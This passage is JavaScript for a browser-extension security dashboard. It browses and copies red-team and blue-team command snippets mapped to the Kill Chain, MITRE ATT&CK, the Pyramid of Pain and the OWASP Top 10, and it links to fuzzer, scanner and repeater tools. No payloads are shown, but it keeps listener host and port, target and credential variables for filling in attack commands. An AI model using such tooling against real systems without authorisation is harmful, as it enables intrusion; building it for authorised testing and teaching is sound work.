          group.querySelectorAll('.os-btn').forEach(b => {
            b.classList.toggle('active', b.dataset.os === state.os);
          });
          refreshAllViews();
        }
      });
    }

    group.querySelectorAll('.os-btn').forEach(btn => {
      btn.addEventListener('click', () => {
        state.os = btn.dataset.os;
        group.querySelectorAll('.os-btn').forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
        if (typeof chrome !== 'undefined' && chrome.storage) {
          chrome.storage.local.set({ cyberOpsOs: state.os });
        }
        // Reinit frameworks so counts update
        initKillChain();
        initAttackMatrix();
        initPyramid();
        initOwasp();
        renderSnippets();
      });
    });
  }

  // ═══════════════════════════════════════════════════════════
  //  TOOL INVENTORY — checkable list, stored in chrome.storage
  // ═══════════════════════════════════════════════════════════

  function initToolInventory() {
    const toggleBtn = document.getElementById('toolsToggleBtn');
    const panel = document.getElementById('toolsPanel');
    const grid = document.getElementById('toolsGrid');
    const selectAllBtn = document.getElementById('toolsSelectAll');
    const selectNoneBtn = document.getElementById('toolsSelectNone');
    const filterToggle = document.getElementById('toolsFilterToggle');
    if (!toggleBtn || !panel || !grid) return;

    // Toggle panel
    toggleBtn.addEventListener('click', () => {
      panel.classList.toggle('open');
      toggleBtn.textContent = panel.classList.contains('open') ? 'Hide Tools' : 'Tools';
    });

    // Build grid of checkboxes
    function renderToolGrid() {
      grid.innerHTML = '';
      // Group by category
      const cats = [...new Set(TOOL_REGISTRY.map(t => t.cat))];
      cats.forEach(cat => {
        const tools = TOOL_REGISTRY.filter(t => t.cat === cat);
        tools.forEach(tool => {
          const item = document.createElement('label');
          item.className = 'tool-item' + (state.installedTools.has(tool.id) ? ' checked' : '');
          item.title = tool.install;

          const cb = document.createElement('input');
          cb.type = 'checkbox';
          cb.checked = state.installedTools.has(tool.id);
          cb.addEventListener('change', () => {
            if (cb.checked) state.installedTools.add(tool.id);
            else state.installedTools.delete(tool.id);
            item.classList.toggle('checked', cb.checked);
            saveToolInventory();
            refreshAllViews();
          });

          const label = document.createElement('span');
          label.textContent = tool.label;

          const catLabel = document.createElement('span');
          catLabel.className = 'tool-cat';
          catLabel.textContent = cat;

          const toolLink = extractExternalLink(tool.install, false);
          const linkBtn = toolLink ? document.createElement('button') : null;
          if (linkBtn) {
            linkBtn.type = 'button';
            linkBtn.className = 'tool-link-btn';
            linkBtn.textContent = /github\.com/i.test(toolLink) ? 'GitHub' : 'Docs';
            linkBtn.title = 'Open install page';
            linkBtn.addEventListener('click', (e) => {
              e.preventDefault();
              e.stopPropagation();
              openExternalLink(toolLink);
            });
          }

          item.appendChild(cb);
          item.appendChild(label);
          item.appendChild(catLabel);
          if (linkBtn) item.appendChild(linkBtn);
          grid.appendChild(item);
        });
      });
    }

    // Select all / none
    selectAllBtn.addEventListener('click', () => {
      state.installedTools = new Set(TOOL_REGISTRY.map(t => t.id));
      saveToolInventory();
      renderToolGrid();
      refreshAllViews();
    });

    selectNoneBtn.addEventListener('click', () => {
      state.installedTools = new Set();
      saveToolInventory();
      renderToolGrid();
      refreshAllViews();
    });

    // Filter toggle
    filterToggle.addEventListener('click', () => {
      state.filterByTools = !state.filterByTools;
      filterToggle.classList.toggle('active', state.filterByTools);
      filterToggle.textContent = state.filterByTools ? 'Show All' : 'Hide Unavailable';
      if (typeof chrome !== 'undefined' && chrome.storage) {
        chrome.storage.local.set({ cyberOpsFilterByTools: state.filterByTools });
      }
      refreshAllViews();
    });

    // Load saved inventory
    if (typeof chrome !== 'undefined' && chrome.storage) {
      chrome.storage.local.get(['cyberOpsInstalledTools', 'cyberOpsFilterByTools'], (result) => {
        if (result.cyberOpsInstalledTools && Array.isArray(result.cyberOpsInstalledTools)) {
          state.installedTools = new Set(result.cyberOpsInstalledTools);
        }
        if (result.cyberOpsFilterByTools) {
          state.filterByTools = true;
          filterToggle.classList.add('active');
          filterToggle.textContent = 'Show All';
        }
        renderToolGrid();
        refreshAllViews();
      });
    } else {
      renderToolGrid();
    }
  }

  function saveToolInventory() {
    if (typeof chrome !== 'undefined' && chrome.storage) {
      chrome.storage.local.set({ cyberOpsInstalledTools: [...state.installedTools] });
    }
  }

  function refreshAllViews() {
    // Refresh whichever detail panel is currently visible
    if (state.activeKcPhase) {
      const phase = KILL_CHAIN.find(p => p.id === state.activeKcPhase);
      if (phase) renderKcDetail(phase);
    }
    if (state.activeAttackTactic) {
      const tactic = ATTACK_TACTICS.find(t => t.id === state.activeAttackTactic);
      if (tactic) renderAttackDetail(tactic);
    }
    if (state.activePyramidLevel) {
      const level = PYRAMID_LEVELS.find(l => l.id === state.activePyramidLevel);
      if (level) renderPyramidDetail(level);
    }
    if (state.activeOwaspCategory) {
      const cat = OWASP_TOP10.find(c => c.id === state.activeOwaspCategory);
      if (cat) renderOwaspDetail(cat);
    }
    renderSnippets();
    renderFavoritesStrip();
    updateStatsBar();
  }

  // ═══════════════════════════════════════════════════════════
  //  FRAMEWORK TABS
  // ═══════════════════════════════════════════════════════════

  document.querySelectorAll('.fw-tab').forEach(tab => {
    tab.addEventListener('click', () => {
      document.querySelectorAll('.fw-tab').forEach(t => t.classList.remove('active'));
      document.querySelectorAll('.fw-panel').forEach(p => p.classList.remove('active'));
      tab.classList.add('active');
      document.querySelector(`.fw-panel[data-fw="${tab.dataset.fw}"]`).classList.add('active');
    });
  });

  // ═══════════════════════════════════════════════════════════
  //  KILL CHAIN
  // ═══════════════════════════════════════════════════════════

  function initKillChain() {
    const container = document.getElementById('kcChain');
    container.innerHTML = '';

    KILL_CHAIN.forEach(phase => {
      const all = getAllSnippets();
      const items = all.filter(s => s.killchain === phase.id && matchesOs(s));

      const el = document.createElement('div');
      el.className = 'kc-phase';
      el.dataset.phase = phase.id;

      const head = document.createElement('div');
      head.className = 'kc-phase-head';
      head.innerHTML = `${phase.label}<span class="kc-phase-count">${items.length} tools</span>`;

      const body = document.createElement('div');
      body.className = 'kc-phase-body';

      items.slice(0, 6).forEach(item => {
        const tag = document.createElement('span');
        tag.className = 'kc-mini-tag ' + item.team;
        tag.textContent = item.title.length > 18 ? item.title.substring(0, 16) + '..' : item.title;
        tag.title = item.title;
        body.appendChild(tag);
      });

      if (items.length > 6) {
        const more = document.createElement('span');
        more.className = 'kc-mini-tag';
        more.textContent = `+${items.length - 6} more`;
        body.appendChild(more);
      }

      el.appendChild(head);
      el.appendChild(body);
      container.appendChild(el);

      el.addEventListener('click', () => {
        state.activeKcPhase = phase.id;
        document.querySelectorAll('.kc-phase').forEach(p => p.classList.remove('active'));
        el.classList.add('active');
        renderKcDetail(phase);
      });
    });

    const firstPhase = container.querySelector('.kc-phase');
    if (firstPhase) firstPhase.click();
  }

  function renderKcDetail(phase) {
    const container = document.getElementById('kcDetail');
    const all = getAllSnippets();
    const items = all.filter(s => s.killchain === phase.id && matchesOs(s));
    const redItems = items.filter(s => s.team === 'red');
    const blueItems = items.filter(s => s.team === 'blue');

    container.innerHTML = '';

    const header = document.createElement('div');
    header.className = 'phase-detail-header';
    header.style.padding = '16px 24px 0';
    header.innerHTML = `
      <h2>${phase.label}</h2>
      <span class="team-label red">${redItems.length} Red</span>
      <span class="team-label blue">${blueItems.length} Blue</span>
      <span style="color:var(--co-text-muted);font-size:13px;margin-left:8px;">${phase.desc}</span>`;
    container.appendChild(header);

    const grid = document.createElement('div');
    grid.className = 'snippet-grid';
    [...redItems, ...blueItems].forEach(item => grid.appendChild(makeCard(item)));
    container.appendChild(grid);

    if (items.length === 0) {
      container.insertAdjacentHTML('beforeend', '<div class="empty">No tools mapped to this phase yet.</div>');
    }
  }

  // ═══════════════════════════════════════════════════════════
  //  MITRE ATT&CK
  // ═══════════════════════════════════════════════════════════

  function initAttackMatrix() {
    const container = document.getElementById('attackMatrix');
    container.innerHTML = '';

    const grid = document.createElement('div');
    grid.className = 'attack-grid';

    ATTACK_TACTICS.forEach(tactic => {
      const all = getAllSnippets();
      const items = all.filter(s => s.attack.includes(tactic.id) && matchesOs(s));

      const col = document.createElement('div');

      const header = document.createElement('div');
      header.className = 'attack-tactic';
      header.dataset.tactic = tactic.id;
      header.innerHTML = `<span class="attack-count">${items.length}</span>${tactic.label}`;
      header.addEventListener('click', () => {
        state.activeAttackTactic = tactic.id;
        document.querySelectorAll('.attack-tactic').forEach(t => t.classList.remove('active'));
        header.classList.add('active');
        renderAttackDetail(tactic);
      });

      const techniques = document.createElement('div');
      techniques.className = 'attack-techniques';
      items.slice(0, 5).forEach(item => {
        const el = document.createElement('div');
        el.className = 'attack-tech-item ' + item.team;
        el.textContent = item.title;
        el.title = item.description;
        techniques.appendChild(el);
      });
      if (items.length > 5) {
        const more = document.createElement('div');
        more.className = 'attack-tech-item';
        more.textContent = `+${items.length - 5} more`;
        more.style.fontStyle = 'italic';
        techniques.appendChild(more);
      }

      col.appendChild(header);
      col.appendChild(techniques);
      grid.appendChild(col);
    });

    container.appendChild(grid);
  }

  function renderAttackDetail(tactic) {
    const container = document.getElementById('attackDetail');
    const all = getAllSnippets();
    const items = all.filter(s => s.attack.includes(tactic.id) && matchesOs(s));

    container.innerHTML = '';
    const header = document.createElement('div');
    header.className = 'phase-detail-header';
    header.style.padding = '16px 24px 0';
    header.innerHTML = `<h2>${tactic.label}</h2><span class="badge">${tactic.code}</span><span style="margin-left:8px;color:var(--co-text-muted);font-size:13px;">${items.length} techniques mapped</span>`;
    container.appendChild(header);

    const grid = document.createElement('div');
    grid.className = 'snippet-grid';
    items.forEach(item => grid.appendChild(makeCard(item)));
    container.appendChild(grid);
  }

  // ═══════════════════════════════════════════════════════════
  //  PYRAMID OF PAIN
  // ═══════════════════════════════════════════════════════════

  function initPyramid() {
    const container = document.getElementById('pyramidWrap');
    container.innerHTML = '';

    PYRAMID_LEVELS.forEach(level => {
      const all = getAllSnippets();
      const items = all.filter(s => s.pyramid === level.id && matchesOs(s));

      const el = document.createElement('div');
      el.className = 'pyramid-level';
      el.dataset.level = level.id;

      const pain = document.createElement('span');
      pain.className = 'pyramid-pain ' + level.painClass;
      pain.textContent = level.pain;

      const label = document.createElement('span');
      label.className = 'pyramid-label';
      label.textContent = level.label;

      const count = document.createElement('span');
      count.className = 'badge';
      count.textContent = `${items.length} tools`;

      el.appendChild(pain);
      el.appendChild(label);
      el.appendChild(count);
      container.appendChild(el);

      el.addEventListener('click', () => {
        state.activePyramidLevel = level.id;
        document.querySelectorAll('.pyramid-level').forEach(l => l.classList.remove('active'));
        el.classList.add('active');
        renderPyramidDetail(level);
      });
    });
  }

  function renderPyramidDetail(level) {
    const container = document.getElementById('pyramidDetail');
    const all = getAllSnippets();
    const items = all.filter(s => s.pyramid === level.id && matchesOs(s));

    container.innerHTML = '';

    const info = document.createElement('div');
    info.className = 'fw-info';
    info.innerHTML = `<strong>${level.label}</strong> — ${level.desc}`;
    container.appendChild(info);

    const grid = document.createElement('div');
    grid.className = 'snippet-grid';
    items.forEach(item => grid.appendChild(makeCard(item)));
    container.appendChild(grid);

    if (items.length === 0) {
      container.insertAdjacentHTML('beforeend', '<div class="empty">No tools mapped to this level yet.</div>');
    }
  }

  // ═══════════════════════════════════════════════════════════
  //  OWASP TOP 10
  // ═══════════════════════════════════════════════════════════

  function initOwasp() {
    const container = document.getElementById('owaspGrid');
    container.innerHTML = '';

    OWASP_TOP10.forEach(cat => {
      const all = getAllSnippets();
      const items = all.filter(s => s.owasp && s.owasp.includes(cat.id) && matchesOs(s));

      const card = document.createElement('div');
      card.className = 'owasp-card';
      card.dataset.owasp = cat.id;

      card.innerHTML = `
        <div class="owasp-code">${cat.code}</div>
        <div class="owasp-name">${cat.label}</div>
        <div class="owasp-count">${items.length} tools mapped</div>`;

      card.addEventListener('click', () => {
        state.activeOwaspCategory = cat.id;
        document.querySelectorAll('.owasp-card').forEach(c => c.classList.remove('active'));
        card.classList.add('active');
        renderOwaspDetail(cat);
      });

      container.appendChild(card);
    });
  }

  function renderOwaspDetail(cat) {
    const container = document.getElementById('owaspDetail');
    const all = getAllSnippets();
    const items = all.filter(s => s.owasp && s.owasp.includes(cat.id) && matchesOs(s));
    const redItems = items.filter(s => s.team === 'red');
    const blueItems = items.filter(s => s.team === 'blue');

    container.innerHTML = '';

    const header = document.createElement('div');
    header.className = 'phase-detail-header';
    header.style.padding = '16px 24px 0';
    header.innerHTML = `
      <h2>${cat.code}: ${cat.label}</h2>
      <span class="team-label red">${redItems.length} Exploit</span>
      <span class="team-label blue">${blueItems.length} Mitigate</span>`;
    container.appendChild(header);

    const info = document.createElement('div');
    info.className = 'fw-info';
    info.textContent = cat.desc;
    container.appendChild(info);

    const grid = document.createElement('div');
    grid.className = 'snippet-grid';
    [...redItems, ...blueItems].forEach(item => grid.appendChild(makeCard(item)));
    container.appendChild(grid);

    if (items.length === 0) {
      container.insertAdjacentHTML('beforeend', '<div class="empty">No tools mapped to this OWASP category yet.</div>');
    }
  }

  // ═══════════════════════════════════════════════════════════
  //  ALL SNIPPETS (searchable)
  // ═══════════════════════════════════════════════════════════

  function initSnippets() {
    const all = getAllSnippets();
    const categories = [...new Set(all.map(s => s.category))].sort();
    const sel = document.getElementById('categorySelect');
    // Clear old options except "All"
    while (sel.options.length > 1) sel.remove(1);
    categories.forEach(cat => {
      const opt = document.createElement('option');
      opt.value = cat;
      opt.textContent = cat.charAt(0).toUpperCase() + cat.slice(1);
      sel.appendChild(opt);
    });

    const inputs = {
      search: document.getElementById('searchInput'),
      category: document.getElementById('categorySelect'),
      team: document.getElementById('teamSelect'),
    };

    inputs.search.addEventListener('input', () => { state.search = inputs.search.value.trim().toLowerCase(); renderSnippets(); });
    inputs.category.addEventListener('change', () => { state.category = inputs.category.value; renderSnippets(); });
    inputs.team.addEventListener('change', () => { state.team = inputs.team.value; renderSnippets(); });

    renderSnippets();
  }

  function renderSnippets() {
    const all = getAllSnippets();
    const items = all.filter(item => {
      if (state.category !== 'all' && item.category !== state.category) return false;
      if (state.team !== 'all' && item.team !== state.team) return false;
      if (!matchesOs(item)) return false;
      if (state.search) {
        const haystack = [item.title, item.description, item.command, item.category, item.team, ...item.tags, ...(item.owasp || [])].join(' ').toLowerCase();
        if (!haystack.includes(state.search)) return false;
      }
      return true;
    });

    document.getElementById('resultBadge').textContent = `${items.length} snippet${items.length === 1 ? '' : 's'}`;

    const grid = document.getElementById('snippetGrid');
    grid.innerHTML = '';
    items.forEach(item => grid.appendChild(makeCard(item)));

    document.getElementById('emptyState').style.display = items.length === 0 ? 'block' : 'none';
  }

  // ═══════════════════════════════════════════════════════════
  //  NOTION SYNC — Pull tools from Security Tools DB
  // ═══════════════════════════════════════════════════════════

  const NOTION_SECURITY_TOOLS_DB = process.env.NOTION_SECURITY_TOOLS_DB || null;
  const NOTION_COMMAND_LIBRARY_DB = process.env.NOTION_COMMAND_LIBRARY_DB || null;

  async function notionSync() {
    const syncBtn = document.getElementById('notionSyncBtn');
    const syncStatus = document.getElementById('syncStatus');
    syncBtn.disabled = true;
    syncStatus.style.display = 'inline-flex';
    syncStatus.textContent = 'Syncing...';

    try {
      // Request Notion data via service worker
      const response = await chrome.runtime.sendMessage({
        action: 'cyberOpsNotionSync',
        databases: [NOTION_SECURITY_TOOLS_DB, NOTION_COMMAND_LIBRARY_DB],
      });

      if (response && response.error) {
        syncStatus.textContent = response.error;
        setTimeout(() => { syncStatus.style.display = 'none'; }, 3000);
        return;
      }

      if (response && response.snippets) {
        notionSnippets = response.snippets;
        // Cache in storage
        await chrome.storage.local.set({ cyberOpsNotionSnippets: notionSnippets });
        syncStatus.textContent = `${notionSnippets.length} synced`;

        // Reinitialize all views with new data
        initKillChain();
        initAttackMatrix();
        initPyramid();
        initOwasp();
        initSnippets();

        setTimeout(() => { syncStatus.style.display = 'none'; }, 3000);
      }
    } catch (err) {
      syncStatus.textContent = 'Sync failed';
      console.error('Notion sync error:', err);
      setTimeout(() => { syncStatus.style.display = 'none'; }, 3000);
    } finally {
      syncBtn.disabled = false;
    }
  }

  function loadCachedNotionSnippets() {
    if (typeof chrome !== 'undefined' && chrome.storage) {
      chrome.storage.local.get(['cyberOpsNotionSnippets'], (result) => {
        if (result.cyberOpsNotionSnippets && result.cyberOpsNotionSnippets.length) {
          notionSnippets = result.cyberOpsNotionSnippets;
          // Refresh views
          initKillChain();
          initAttackMatrix();
          initPyramid();
          initOwasp();
          initSnippets();
        }
      });
    }
  }

  // ═══════════════════════════════════════════════════════════
  //  FAVORITES — star snippets for quick access
  // ═══════════════════════════════════════════════════════════

  function saveFavorites() {
    if (typeof chrome !== 'undefined' && chrome.storage) {
      chrome.storage.local.set({ cyberOpsFavorites: [...state.favorites] });
    }
  }

  function loadFavorites(cb) {
    if (typeof chrome !== 'undefined' && chrome.storage) {
      chrome.storage.local.get(['cyberOpsFavorites'], (result) => {
        if (result.cyberOpsFavorites && Array.isArray(result.cyberOpsFavorites)) {
          state.favorites = new Set(result.cyberOpsFavorites);
        }
        if (cb) cb();
      });
    } else if (cb) cb();
  }

  function renderFavoritesStrip() {
    const strip = document.getElementById('favoritesStrip');
    const scroll = document.getElementById('favoritesScroll');
    const countEl = document.getElementById('favCount');
    if (!strip || !scroll) return;

    const all = getAllSnippets();
    const favItems = all.filter(s => state.favorites.has(s.id));

    strip.classList.toggle('has-favs', favItems.length > 0);
    countEl.textContent = favItems.length;
    scroll.innerHTML = '';

    favItems.forEach(item => {
      const chip = document.createElement('div');
      chip.className = 'fav-chip';
      chip.title = renderCmd(resolveCommand(item));

      const dot = document.createElement('span');
      dot.className = 'fav-chip-team ' + item.team;

      const label = document.createElement('span');
      label.textContent = item.title;

      const copyHint = document.createElement('span');
      copyHint.className = 'fav-chip-copy';
      copyHint.textContent = 'click=copy';

      chip.appendChild(dot);
      chip.appendChild(label);
      chip.appendChild(copyHint);

      chip.addEventListener('click', async () => {
        try {
          await navigator.clipboard.writeText(renderCmd(resolveCommand(item)));
          copyHint.textContent = 'copied!';
          setTimeout(() => { copyHint.textContent = 'click=copy'; }, 1200);
        } catch { copyHint.textContent = 'failed'; }
      });

      scroll.appendChild(chip);
    });
  }

  // ═══════════════════════════════════════════════════════════
  //  STATS BAR — snippet counts
  // ═══════════════════════════════════════════════════════════

  function updateStatsBar() {
    const all = getAllSnippets();
    const osFiltered = all.filter(s => matchesOs(s));

    const statTotal = document.getElementById('statTotal');
    const statRed = document.getElementById('statRed');
    const statBlue = document.getElementById('statBlue');
    const statOs = document.getElementById('statOs');
    const statOsLabel = document.getElementById('statOsLabel');
    const statCats = document.getElementById('statCats');
    const statTools = document.getElementById('statTools');

    if (statTotal) statTotal.textContent = all.length;
    if (statRed) statRed.textContent = all.filter(s => s.team === 'red').length;
    if (statBlue) statBlue.textContent = all.filter(s => s.team === 'blue').length;
    if (statOs) statOs.textContent = osFiltered.length;
    if (statOsLabel) {
      const labels = { all: 'visible (all OS)', linux: 'for Linux', windows: 'for Windows', macos: 'for macOS' };
      statOsLabel.textContent = labels[state.os] || 'visible';
    }
    if (statCats) statCats.textContent = new Set(all.map(s => s.category)).size;
    if (statTools) statTools.textContent = TOOL_REGISTRY.length;
  }

  // ═══════════════════════════════════════════════════════════
  //  KEYBOARD SHORTCUTS
  // ═══════════════════════════════════════════════════════════

  function initKeyboardShortcuts() {
    document.addEventListener('keydown', (e) => {
      // Cheat-sheet overlay toggle (? key or Escape to close)
      const overlay = document.getElementById('cheatsheetOverlay');
      if (e.key === 'Escape' && overlay && overlay.classList.contains('open')) {
        overlay.classList.remove('open');
        return;
      }

      // Skip if typing in an input/textarea
      const tag = document.activeElement.tagName;
      if (tag === 'INPUT' || tag === 'TEXTAREA' || tag === 'SELECT') {
        // Escape blurs the input
        if (e.key === 'Escape') document.activeElement.blur();
        return;
      }

      // ? → toggle cheat-sheet
      if (e.key === '?') {
        if (overlay) overlay.classList.toggle('open');
        return;
      }

      // Ctrl+K or / → focus search
      if (e.key === '/' || (e.ctrlKey && e.key === 'k')) {
        e.preventDefault();
        // Switch to All Snippets tab first
        const snippetsTab = document.querySelector('.fw-tab[data-fw="snippets"]');
        if (snippetsTab && !snippetsTab.classList.contains('active')) snippetsTab.click();
        const searchInput = document.getElementById('searchInput');
        if (searchInput) searchInput.focus();
        return;
      }

      // Ctrl+E → export
      if (e.ctrlKey && e.key === 'e') {
        e.preventDefault();
        exportConfig();
        return;
      }

      // 1-4 → OS switch (when not in input)
      const osKeys = { '1': 'all', '2': 'linux', '3': 'windows', '4': 'macos' };
      if (osKeys[e.key]) {
        e.preventDefault();
        const btn = document.querySelector(`.os-btn[data-os="${osKeys[e.key]}"]`);
        if (btn) btn.click();
        return;
      }

      // Ctrl+1-5 → switch framework tabs
      if (e.ctrlKey && e.key >= '1' && e.key <= '5') {
        e.preventDefault();
        const tabs = document.querySelectorAll('.fw-tab');
        const idx = parseInt(e.key) - 1;
        if (tabs[idx]) tabs[idx].click();
        return;
      }
    });
  }

  // ═══════════════════════════════════════════════════════════
  //  EXPORT / IMPORT — settings, favorites, tools as JSON
  // ═══════════════════════════════════════════════════════════

  function exportConfig() {
    const config = {
      version: 1,
      exportDate: new Date().toISOString(),
      os: state.os,
      vars: {
        target: state.target, lhost: state.lhost, lport: state.lport,
        domain: state.domain, user: state.user, pass: state.pass,
      },
      favorites: [...state.favorites],
      installedTools: [...state.installedTools],
      filterByTools: state.filterByTools,
    };

    const blob = new Blob([JSON.stringify(config, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `cyber-ops-config-${new Date().toISOString().slice(0, 10)}.json`;
    a.click();
    URL.revokeObjectURL(url);
  }

  function importConfig(file) {
    const reader = new FileReader();
    reader.onload = (e) => {
      try {
        const config = JSON.parse(e.target.result);
        if (!config.version) throw new Error('Invalid config file');

        // Restore state
        if (config.os) {
          state.os = config.os;
          const osGroup = document.getElementById('osGroup');
          if (osGroup) {
            osGroup.querySelectorAll('.os-btn').forEach(b => {
              b.classList.toggle('active', b.dataset.os === state.os);
            });
          }
        }

        if (config.vars) {
          Object.keys(config.vars).forEach(key => {
            state[key] = config.vars[key];
            const input = document.getElementById('global' + key.charAt(0).toUpperCase() + key.slice(1));
            if (input) input.value = config.vars[key];
          });
        }

        if (config.favorites) {
          state.favorites = new Set(config.favorites);
          saveFavorites();
        }

        if (config.installedTools) {
          state.installedTools = new Set(config.installedTools);
          saveToolInventory();
        }

        if (typeof config.filterByTools === 'boolean') {
          state.filterByTools = config.filterByTools;
        }

        // Save everything
        if (typeof chrome !== 'undefined' && chrome.storage) {
          chrome.storage.local.set({
            cyberOpsOs: state.os,
            cyberOpsVars: config.vars || {},
            cyberOpsFilterByTools: state.filterByTools,
          });
        }

        // Full refresh
        initKillChain();
        initAttackMatrix();
        initPyramid();
        initOwasp();
        initSnippets();
        renderFavoritesStrip();
        updateStatsBar();

        // Reinit tool inventory grid
        const grid = document.getElementById('toolsGrid');
        if (grid) {
          grid.querySelectorAll('input[type="checkbox"]').forEach(cb => {
            const toolId = cb.closest('.tool-item').querySelector('.tool-cat')
              ? cb.closest('.tool-item').querySelector('span:not(.tool-cat)').textContent
              : '';
            // Re-render tool grid by re-calling init
          });
        }

        // Flash success on import button
        const importBtn = document.getElementById('importBtn');
        if (importBtn) {
          const orig = importBtn.textContent;
          importBtn.textContent = 'Imported!';
          importBtn.style.color = 'var(--co-green)';
          importBtn.style.borderColor = 'var(--co-green)';
          setTimeout(() => {
            importBtn.textContent = orig;
            importBtn.style.color = '';
            importBtn.style.borderColor = '';
          }, 2000);
        }
      } catch (err) {
        console.error('Import error:', err);
        const importBtn = document.getElementById('importBtn');
        if (importBtn) {
          importBtn.textContent = 'Invalid file';
          importBtn.style.color = 'var(--co-red)';
          setTimeout(() => { importBtn.textContent = 'Import'; importBtn.style.color = ''; }, 2000);
        }
      }
    };
    reader.readAsText(file);
  }

  function initExportImport() {
    const exportBtn = document.getElementById('exportBtn');
    const importBtn = document.getElementById('importBtn');
    const importFile = document.getElementById('importFile');

    if (exportBtn) exportBtn.addEventListener('click', exportConfig);
    if (importBtn) importBtn.addEventListener('click', () => importFile.click());
    if (importFile) importFile.addEventListener('change', (e) => {
      if (e.target.files[0]) importConfig(e.target.files[0]);
      e.target.value = ''; // Reset so same file can be re-imported
    });
  }

  // ═══════════════════════════════════════════════════════════
  //  CHEAT-SHEET OVERLAY
  // ═══════════════════════════════════════════════════════════

  function initCheatSheet() {
    const overlay = document.getElementById('cheatsheetOverlay');
    const closeBtn = document.getElementById('cheatsheetClose');
    if (!overlay) return;
    // Close button
    if (closeBtn) closeBtn.addEventListener('click', () => overlay.classList.remove('open'));
    // Click outside to close
    overlay.addEventListener('click', (e) => {
      if (e.target === overlay) overlay.classList.remove('open');
    });
  }

  // ═══════════════════════════════════════════════════════════
  //  INTERACTIVE TOOL LAUNCHERS
  // ═══════════════════════════════════════════════════════════

  function openTool(page, tab) {
    const url = chrome.runtime.getURL(page) + (tab ? `#${tab}` : '');
    chrome.tabs.create({ url });
  }

  document.getElementById('launchRepeater').addEventListener('click', () => openTool('security-hub/security-toolkit.html', 'repeater'));
  document.getElementById('launchScanner').addEventListener('click', () => openTool('security-hub/security-toolkit.html', 'scanner'));
  document.getElementById('launchFuzzer').addEventListener('click', () => openTool('security-hub/security-toolkit.html', 'fuzzer'));
  document.getElementById('launchEncoder').addEventListener('click', () => openTool('security-hub/security-toolkit.html', 'encoder'));
  document.getElementById('launchHashes').addEventListener('click', () => openTool('security-hub/security-toolkit.html', 'hashes'));
  document.getElementById('notionSyncBtn').addEventListener('click', notionSync);

  // ═══════════════════════════════════════════════════════════
  //  INIT
  // ═══════════════════════════════════════════════════════════

  loadFavorites(() => {
    initVarBar();
    initOsSelector();
    initToolInventory();
    initKillChain();
    initAttackMatrix();
    initPyramid();
    initOwasp();
    initSnippets();
    initKeyboardShortcuts();
    initExportImport();
    initCheatSheet();
    renderFavoritesStrip();
    updateStatsBar();
    loadCachedNotionSnippets();
  });
})();
